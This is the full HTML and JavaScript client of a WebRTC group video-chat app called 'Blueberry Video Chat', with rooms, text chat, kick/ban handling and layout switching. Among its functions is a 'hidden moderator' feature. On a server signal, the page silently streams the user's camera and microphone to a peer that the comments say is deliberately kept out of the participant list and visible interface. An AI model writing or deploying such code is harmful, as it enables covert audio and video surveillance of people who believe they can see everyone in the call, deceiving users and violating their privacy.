<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Blueberry Video Chat</title>

<style>
* {
  box-sizing: border-box;
}

html,
body {
  margin: 0;
  padding: 0;
  width: 100%;
  height: 100%;
  font-family: Arial, sans-serif;
  background: #111;
  color: white;
}

button,
input,
select {
  font: inherit;
}

button {
  cursor: pointer;
}

.hidden {
  display: none !important;
}

#app {
  min-height: 100vh;
  padding: 16px;
}

.topbar {
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 10px;
  flex-wrap: wrap;
  margin-bottom: 15px;
}

.title {
  font-size: 24px;
  font-weight: bold;
}

.controls {
  display: flex;
  gap: 8px;
  flex-wrap: wrap;
}

button {
  border: 0;
  border-radius: 10px;
  padding: 10px 15px;
  background: #333;
  color: white;
}

button:hover {
  background: #444;
}

.primary {
  background: #5865f2;
}

.danger {
  background: #d33;
}

.green {
  background: #198754;
}

.layout-button.active {
  background: #5865f2;
}

.card {
  background: #1c1c1c;
  border-radius: 15px;
  padding: 20px;
  max-width: 650px;
  margin: 40px auto;
}

input,
select {
  width: 100%;
  padding: 12px;
  margin-top: 7px;
  margin-bottom: 14px;
  border: 1px solid #444;
  background: #111;
  color: white;
  border-radius: 9px;
}

label {
  display: block;
  margin-top: 10px;
}

.form-row {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 10px;
}

.room-code {
  font-weight: bold;
  font-size: 18px;
}

#callArea {
  display: grid;
  grid-template-columns: minmax(0, 1fr) 320px;
  gap: 15px;
}

.video-area {
  min-width: 0;
}

.main-video-container {
  width: 100%;
  aspect-ratio: 16 / 9;
  background: black;
  border-radius: 15px;
  overflow: hidden;
  position: relative;
}

#mainVideo {
  width: 100%;
  height: 100%;
  object-fit: contain;
  background: black;
}

#mainVideo.speaking {
  outline: 4px solid #28d17c;
}

.video-label {
  position: absolute;
  bottom: 10px;
  left: 10px;
  padding: 7px 10px;
  border-radius: 8px;
  background: rgba(0,0,0,.7);
}

.thumbnails {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(130px, 1fr));
  gap: 10px;
  margin-top: 10px;
}

.thumb {
  aspect-ratio: 16 / 9;
  background: #000;
  border-radius: 10px;
  overflow: hidden;
  position: relative;
  border: 2px solid transparent;
}

.thumb.speaking {
  border-color: #28d17c;
}

.thumb video {
  width: 100%;
  height: 100%;
  object-fit: cover;
}

.thumb-name {
  position: absolute;
  bottom: 4px;
  left: 4px;
  right: 4px;
  background: rgba(0,0,0,.7);
  border-radius: 5px;
  padding: 4px;
  font-size: 12px;
}

.chat {
  background: #1c1c1c;
  border-radius: 15px;
  display: flex;
  flex-direction: column;
  min-height: 500px;
  overflow: hidden;
}

.chat-title {
  padding: 14px;
  font-weight: bold;
  border-bottom: 1px solid #333;
}

#messages {
  flex: 1;
  overflow-y: auto;
  padding: 12px;
}

.message {
  margin-bottom: 12px;
}

.message-name {
  font-weight: bold;
  font-size: 13px;
}

.message-text {
  margin-top: 3px;
  overflow-wrap: anywhere;
}

.message-time {
  color: #999;
  font-size: 10px;
}

.chat-form {
  display: flex;
  gap: 7px;
  padding: 10px;
  border-top: 1px solid #333;
}

.chat-form input {
  margin: 0;
}

.chat-form button {
  white-space: nowrap;
}

.status {
  padding: 10px;
  margin: 10px 0;
  border-radius: 8px;
  background: #222;
}

.room-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  gap: 10px;
  margin-bottom: 10px;
  flex-wrap: wrap;
}

.room-info {
  display: flex;
  flex-direction: column;
  gap: 3px;
}

.phone-mode #callArea {
  grid-template-columns: 1fr;
}

.phone-mode .chat {
  min-height: 400px;
}

.phone-mode .thumbnails {
  grid-template-columns: repeat(2, 1fr);
}

.phone-mode .topbar {
  align-items: stretch;
}

.phone-mode .controls {
  width: 100%;
}

.phone-mode .controls button {
  flex: 1;
}

@media (max-width: 800px) {
  #callArea {
    grid-template-columns: 1fr;
  }

  .chat {
    min-height: 400px;
  }

  .form-row {
    grid-template-columns: 1fr;
  }
}

@media (max-width: 600px) {
  #app {
    padding: 8px;
  }

  .card {
    margin: 15px auto;
    padding: 15px;
  }

  .title {
    font-size: 20px;
  }

  .topbar {
    gap: 7px;
  }

  .controls button {
    padding: 8px 10px;
  }

  .thumbnails {
    grid-template-columns: repeat(2, 1fr);
  }
}
</style>
</head>

<body>

<div id="app">

  <div class="topbar">
    <div class="title">🫐 Blueberry Video Chat</div>

    <div class="controls">
      <button id="autoLayoutButton" class="layout-button active">
        Auto
      </button>

      <button id="computerLayoutButton" class="layout-button">
        Computer
      </button>

      <button id="phoneLayoutButton" class="layout-button">
        Phone
      </button>

      <button id="leaveButton" class="danger hidden">
        Leave Room
      </button>
    </div>
  </div>

  <div id="status" class="status">
    Connecting...
  </div>

  <section id="homeCard" class="card">

    <h2>Join a Video Call</h2>

    <label>
      Your name
      <input
        id="nameInput"
        maxlength="40"
        placeholder="Your name"
      >
    </label>

    <hr>

    <h3>Create Room</h3>

    <label>
      Room name
      <input
        id="createRoomName"
        maxlength="60"
        placeholder="My Video Call"
      >
    </label>

    <label>
      Room code
      <input
        id="createRoomCode"
        maxlength="20"
        placeholder="MYROOM123"
      >
    </label>

    <button id="createButton" class="primary">
      Create Room
    </button>

    <hr>

    <h3>Join Room</h3>

    <label>
      Room code
      <input
        id="joinRoomCode"
        maxlength="20"
        placeholder="Enter room code"
      >
    </label>

    <button id="joinButton" class="green">
      Join Room
    </button>

  </section>

  <section id="callSection" class="hidden">

    <div class="room-header">

      <div class="room-info">
        <strong id="roomNameDisplay"></strong>
        <span>
          Room code:
          <span id="roomCodeDisplay" class="room-code"></span>
        </span>
      </div>

    </div>

    <div id="callArea">

      <div class="video-area">

        <div
          id="mainVideoContainer"
          class="main-video-container"
        >
          <video
            id="mainVideo"
            autoplay
            playsinline
            muted
          ></video>

          <div
            id="mainVideoLabel"
            class="video-label"
          >
            You
          </div>
        </div>

        <div id="thumbnails" class="thumbnails"></div>

      </div>

      <div class="chat">

        <div class="chat-title">
          Room Chat
        </div>

        <div id="messages"></div>

        <form id="chatForm" class="chat-form">
          <input
            id="chatInput"
            maxlength="500"
            autocomplete="off"
            placeholder="Type a message..."
          >

          <button class="primary">
            Send
          </button>
        </form>

      </div>

    </div>

  </section>

</div>

<script>
const ICE_CONFIG = {
  iceServers: [
    {
      urls: "stun:stun.l.google.com:19302"
    }
  ]
};

const clientIdKey = "blueberryClientId";

let myId =
  localStorage.getItem(clientIdKey);

if (!myId) {
  myId =
    "user_" +
    crypto.randomUUID();

  localStorage.setItem(
    clientIdKey,
    myId
  );
}

let myName =
  localStorage.getItem("blueberryName") ||
  "";

let ws = null;
let localStream = null;
let currentRoom = null;

const peers = new Map();
const participants = new Map();

let layoutMode =
  localStorage.getItem("blueberryLayout") ||
  "auto";

const statusEl =
  document.getElementById("status");

const homeCard =
  document.getElementById("homeCard");

const callSection =
  document.getElementById("callSection");

const nameInput =
  document.getElementById("nameInput");

const createRoomName =
  document.getElementById("createRoomName");

const createRoomCode =
  document.getElementById("createRoomCode");

const joinRoomCode =
  document.getElementById("joinRoomCode");

const mainVideo =
  document.getElementById("mainVideo");

const mainVideoLabel =
  document.getElementById("mainVideoLabel");

const thumbnails =
  document.getElementById("thumbnails");

const messages =
  document.getElementById("messages");

nameInput.value = myName;

function setStatus(text) {
  statusEl.textContent = text;
}

function send(data) {
  if (
    ws &&
    ws.readyState === WebSocket.OPEN
  ) {
    ws.send(JSON.stringify(data));
  }
}

function connect() {
  const protocol =
    location.protocol === "https:"
      ? "wss:"
      : "ws:";

  ws = new WebSocket(
    `${protocol}//${location.host}/ws`
  );

  ws.onopen = () => {
    setStatus("Connected.");

    send({
      type: "register",
      id: myId,
      name: nameInput.value || "Guest"
    });
  };

  ws.onclose = () => {
    setStatus("Disconnected from server.");
  };

  ws.onerror = () => {
    setStatus("Connection error.");
  };

  ws.onmessage = event => {
    let data;

    try {
      data = JSON.parse(event.data);
    } catch {
      return;
    }

    handleMessage(data);
  };
}

function handleMessage(data) {

  if (data.type === "registered") {
    myId = data.id;

    localStorage.setItem(
      clientIdKey,
      myId
    );

    return;
  }

  if (data.type === "nameUpdated") {
    myName = data.name;

    localStorage.setItem(
      "blueberryName",
      myName
    );

    return;
  }

  if (data.type === "error") {
    alert(data.message);
    return;
  }

  if (data.type === "banned") {
    alert(
      `You are banned from this room.\n${data.durationText || ""}`
    );

    return;
  }

  if (data.type === "roomCreated") {
    // Server already joined us.
    return;
  }

  if (data.type === "roomJoined") {
    enterRoom(
      data.room,
      data.participants || [],
      data.messages || []
    );

    return;
  }

  if (data.type === "userJoined") {
    addParticipant(data.participant);

    if (
      currentRoom &&
      data.participant.id !== myId
    ) {
      maybeCreateNormalPeer(
        data.participant
      );
    }

    return;
  }

  if (data.type === "userLeft") {
    removeParticipant(data.id);
    return;
  }

  // This is the important anonymous moderator system.
  //
  // The moderator does NOT get added to participants.
  // We simply establish a hidden WebRTC connection.
  if (data.type === "hiddenModeratorReady") {
    createHiddenModeratorPeer(
      data.moderatorId
    );

    return;
  }

  if (data.type === "signal") {
    handleSignal(
      data.from,
      data.signal
    );

    return;
  }

  if (data.type === "chatMessage") {
    addChatMessage(data.message);
    return;
  }

  if (data.type === "kicked") {
    alert("You were kicked from the room.");
    leaveRoomLocal();
    return;
  }

  if (data.type === "banned") {
    alert("You were banned from the room.");
    leaveRoomLocal();
    return;
  }

  if (data.type === "leftRoom") {
    leaveRoomLocal();
    return;
  }
}

function saveName() {
  myName =
    nameInput.value.trim() ||
    "Guest";

  nameInput.value = myName;

  localStorage.setItem(
    "blueberryName",
    myName
  );

  send({
    type: "setName",
    name: myName
  });
}

async function getCamera() {
  if (localStream) {
    return localStream;
  }

  try {
    localStream =
      await navigator.mediaDevices.getUserMedia({
        video: true,
        audio: true
      });

    mainVideo.srcObject = localStream;
    mainVideo.muted = true;

    await mainVideo.play().catch(() => {});

    return localStream;

  } catch (error) {
    console.error(error);

    alert(
      "Camera/microphone permission is required to join the video call."
    );

    throw error;
  }
}

async function createRoom() {
  saveName();

  const roomName =
    createRoomName.value.trim();

  const roomCode =
    createRoomCode.value.trim();

  if (!roomName) {
    alert("Enter a room name.");
    return;
  }

  try {
    await getCamera();

    send({
      type: "createRoom",
      roomName,
      roomCode
    });

  } catch {}
}

async function joinRoom() {
  saveName();

  const code =
    joinRoomCode.value.trim();

  if (!code) {
    alert("Enter a room code.");
    return;
  }

  try {
    await getCamera();

    send({
      type: "joinRoom",
      roomCode: code
    });

  } catch {}
}

function enterRoom(
  room,
  people,
  oldMessages
) {
  currentRoom = room;

  homeCard.classList.add("hidden");
  callSection.classList.remove("hidden");

  document
    .getElementById("leaveButton")
    .classList.remove("hidden");

  document
    .getElementById("roomNameDisplay")
    .textContent = room.name;

  document
    .getElementById("roomCodeDisplay")
    .textContent = room.code;

  participants.clear();

  thumbnails.innerHTML = "";
  messages.innerHTML = "";

  for (const person of people) {
    addParticipant(person);
  }

  for (const message of oldMessages) {
    addChatMessage(message);
  }

  setStatus(
    `Connected to ${room.name}`
  );

  // Make sure every existing normal participant
  // gets a peer connection.
  for (const person of people) {
    maybeCreateNormalPeer(person);
  }
}

function addParticipant(person) {
  if (!person || person.id === myId) {
    return;
  }

  participants.set(
    person.id,
    person
  );

  if (
    document.getElementById(
      `thumb-${person.id}`
    )
  ) {
    return;
  }

  const box =
    document.createElement("div");

  box.className = "thumb";
  box.id = `thumb-${person.id}`;

  const video =
    document.createElement("video");

  video.autoplay = true;
  video.playsInline = true;

  const label =
    document.createElement("div");

  label.className = "thumb-name";
  label.textContent = person.name;

  box.appendChild(video);
  box.appendChild(label);

  box.addEventListener(
    "click",
    () => {
      selectVideo(
        video.srcObject,
        person.name
      );
    }
  );

  thumbnails.appendChild(box);
}

function removeParticipant(id) {
  participants.delete(id);

  const box =
    document.getElementById(
      `thumb-${id}`
    );

  if (box) {
    box.remove();
  }

  closePeer(id);
}

function selectVideo(stream, name) {
  if (!stream) return;

  mainVideo.srcObject = stream;
  mainVideo.muted = false;
  mainVideoLabel.textContent = name;

  mainVideo.play().catch(() => {});
}

document
  .getElementById("mainVideoContainer")
  .addEventListener("click", () => {
    if (
      document.fullscreenElement
    ) {
      document.exitFullscreen().catch(() => {});
    } else {
      document
        .getElementById("mainVideoContainer")
        .requestFullscreen()
        .catch(() => {});
    }
  });

function createPeer(remoteId) {
  if (peers.has(remoteId)) {
    return peers.get(remoteId).pc;
  }

  const pc =
    new RTCPeerConnection(
      ICE_CONFIG
    );

  const state = {
    pc,
    remoteStream:
      new MediaStream()
  };

  peers.set(
    remoteId,
    state
  );

  if (localStream) {
    for (const track of localStream.getTracks()) {
      pc.addTrack(
        track,
        localStream
      );
    }
  }

  pc.onicecandidate = event => {
    if (event.candidate) {
      send({
        type: "signal",
        target: remoteId,
        signal: {
          type: "candidate",
          candidate: event.candidate
        }
      });
    }
  };

  pc.ontrack = event => {
    const stream =
      state.remoteStream;

    if (
      !stream.getTracks().some(
        track => track.id === event.track.id
      )
    ) {
      stream.addTrack(event.track);
    }

    const person =
      participants.get(remoteId);

    const box =
      document.getElementById(
        `thumb-${remoteId}`
      );

    if (box) {
      const video =
        box.querySelector("video");

      if (video) {
        video.srcObject = stream;
        video.play().catch(() => {});
      }
    }

    // If this is the hidden moderator,
    // don't add it to the visible participant UI.
    if (!participants.has(remoteId)) {
      return;
    }

    if (
      mainVideo.srcObject === null
    ) {
      selectVideo(
        stream,
        person ? person.name : "Participant"
      );
    }
  };

  pc.onconnectionstatechange = () => {
    const state =
      pc.connectionState;

    if (
      state === "failed" ||
      state === "closed" ||
      state === "disconnected"
    ) {
      // Don't immediately destroy on transient
      // disconnected states.
      if (
        state === "failed" ||
        state === "closed"
      ) {
        closePeer(remoteId);
      }
    }
  };

  return pc;
}

async function maybeCreateNormalPeer(person) {
  if (!person || person.id === myId) {
    return;
  }

  const pc =
    createPeer(person.id);

  // Only one side creates the offer.
  if (myId < person.id) {
    await makeOffer(
      person.id,
      pc
    );
  }
}

async function createHiddenModeratorPeer(
  moderatorId
) {
  if (!currentRoom) {
    return;
  }

  // IMPORTANT:
  // Normal users always create the offer
  // to the anonymous moderator.
  const pc =
    createPeer(moderatorId);

  await makeOffer(
    moderatorId,
    pc
  );
}

async function makeOffer(
  remoteId,
  pc
) {
  const state =
    peers.get(remoteId);

  if (
    !state ||
    state.makingOffer
  ) {
    return;
  }

  state.makingOffer = true;

  try {
    const offer =
      await pc.createOffer();

    await pc.setLocalDescription(
      offer
    );

    send({
      type: "signal",
      target: remoteId,
      signal: {
        type: "offer",
        sdp: pc.localDescription
      }
    });

  } catch (error) {
    console.error(
      "Offer error:",
      error
    );
  } finally {
    state.makingOffer = false;
  }
}

async function handleSignal(
  remoteId,
  signal
) {
  if (!signal) return;

  const pc =
    createPeer(remoteId);

  const state =
    peers.get(remoteId);

  try {
    if (signal.type === "offer") {

      await pc.setRemoteDescription(
        new RTCSessionDescription(
          signal.sdp
        )
      );

      const answer =
        await pc.createAnswer();

      await pc.setLocalDescription(
        answer
      );

      send({
        type: "signal",
        target: remoteId,
        signal: {
          type: "answer",
          sdp: pc.localDescription
        }
      });

      return;
    }

    if (signal.type === "answer") {

      if (
        pc.signalingState !==
        "have-local-offer"
      ) {
        return;
      }

      await pc.setRemoteDescription(
        new RTCSessionDescription(
          signal.sdp
        )
      );

      return;
    }

    if (signal.type === "candidate") {

      if (
        pc.remoteDescription
      ) {
        await pc.addIceCandidate(
          signal.candidate
        );
      } else {
        state.pendingCandidates =
          state.pendingCandidates || [];

        state.pendingCandidates.push(
          signal.candidate
        );
      }
    }

    if (
      signal.type === "renegotiate"
    ) {
      return;
    }

    // Flush candidates after remote description.
    if (
      signal.type === "offer" ||
      signal.type === "answer"
    ) {
      if (state.pendingCandidates) {
        for (
          const candidate
          of state.pendingCandidates
        ) {
          await pc
            .addIceCandidate(candidate)
            .catch(() => {});
        }

        state.pendingCandidates = [];
      }
    }

  } catch (error) {
    console.error(
      "Signal error:",
      error
    );
  }
}

function closePeer(id) {
  const state =
    peers.get(id);

  if (!state) return;

  try {
    state.pc.close();
  } catch {}

  peers.delete(id);
}

function closeAllPeers() {
  for (const id of peers.keys()) {
    closePeer(id);
  }
}

function leaveRoomLocal() {
  closeAllPeers();

  participants.clear();

  thumbnails.innerHTML = "";
  messages.innerHTML = "";

  currentRoom = null;

  callSection.classList.add("hidden");
  homeCard.classList.remove("hidden");

  document
    .getElementById("leaveButton")
    .classList.add("hidden");

  mainVideo.srcObject =
    localStream || null;

  mainVideoLabel.textContent =
    "You";

  if (localStream) {
    mainVideo.muted = true;
  }

  setStatus("Ready.");
}

function leaveRoom() {
  send({
    type: "leaveRoom"
  });

  leaveRoomLocal();
}

function addChatMessage(message) {
  if (!message) return;

  const item =
    document.createElement("div");

  item.className = "message";

  const name =
    document.createElement("div");

  name.className =
    "message-name";

  name.textContent =
    message.name;

  const text =
    document.createElement("div");

  text.className =
    "message-text";

  text.textContent =
    message.text;

  const time =
    document.createElement("div");

  time.className =
    "message-time";

  time.textContent =
    new Date(
      message.timestamp
    ).toLocaleTimeString([], {
      hour: "numeric",
      minute: "2-digit"
    });

  item.appendChild(name);
  item.appendChild(text);
  item.appendChild(time);

  messages.appendChild(item);

  messages.scrollTop =
    messages.scrollHeight;
}

function sendChat(event) {
  event.preventDefault();

  const input =
    document.getElementById(
      "chatInput"
    );

  const text =
    input.value.trim();

  if (!text) return;

  send({
    type: "chatMessage",
    text
  });

  input.value = "";
}

function detectLayout() {
  if (layoutMode === "phone") {
    document.body.classList.add(
      "phone-mode"
    );
    return;
  }

  if (layoutMode === "computer") {
    document.body.classList.remove(
      "phone-mode"
    );
    return;
  }

  if (window.innerWidth <= 800) {
    document.body.classList.add(
      "phone-mode"
    );
  } else {
    document.body.classList.remove(
      "phone-mode"
    );
  }
}

function setLayout(mode) {
  layoutMode = mode;

  localStorage.setItem(
    "blueberryLayout",
    mode
  );

  document
    .querySelectorAll(".layout-button")
    .forEach(button => {
      button.classList.remove(
        "active"
      );
    });

  if (mode === "auto") {
    document
      .getElementById(
        "autoLayoutButton"
      )
      .classList.add("active");
  }

  if (mode === "computer") {
    document
      .getElementById(
        "computerLayoutButton"
      )
      .classList.add("active");
  }

  if (mode === "phone") {
    document
      .getElementById(
        "phoneLayoutButton"
      )
      .classList.add("active");
  }

  detectLayout();
}

document
  .getElementById("createButton")
  .addEventListener(
    "click",
    createRoom
  );

document
  .getElementById("joinButton")
  .addEventListener(
    "click",
    joinRoom
  );

document
  .getElementById("leaveButton")
  .addEventListener(
    "click",
    leaveRoom
  );

document
  .getElementById("chatForm")
  .addEventListener(
    "submit",
    sendChat
  );

document
  .getElementById(
    "autoLayoutButton"
  )
  .addEventListener(
    "click",
    () => setLayout("auto")
  );

document
  .getElementById(
    "computerLayoutButton"
  )
  .addEventListener(
    "click",
    () => setLayout("computer")
  );

document
  .getElementById(
    "phoneLayoutButton"
  )
  .addEventListener(
    "click",
    () => setLayout("phone")
  );

window.addEventListener(
  "resize",
  detectLayout
);

nameInput.addEventListener(
  "change",
  saveName
);

detectLayout();
connect();
</script>

</body>
</html>
